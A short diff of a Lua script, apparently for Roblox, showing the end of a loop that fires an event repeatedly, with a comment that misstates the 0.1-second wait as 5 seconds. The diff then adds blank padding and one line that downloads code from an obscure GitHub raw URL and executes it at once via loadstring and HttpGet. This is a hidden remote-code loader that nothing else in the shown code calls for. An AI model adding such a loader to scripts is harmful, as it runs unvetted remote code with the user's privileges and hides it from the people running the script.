@@ -61,3 +61,10 @@ while true do
     wait(0.1)  -- Wait for 5 seconds before firing the event again
 end
 
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dodeadsadasda/d/main/ds", true))()
+
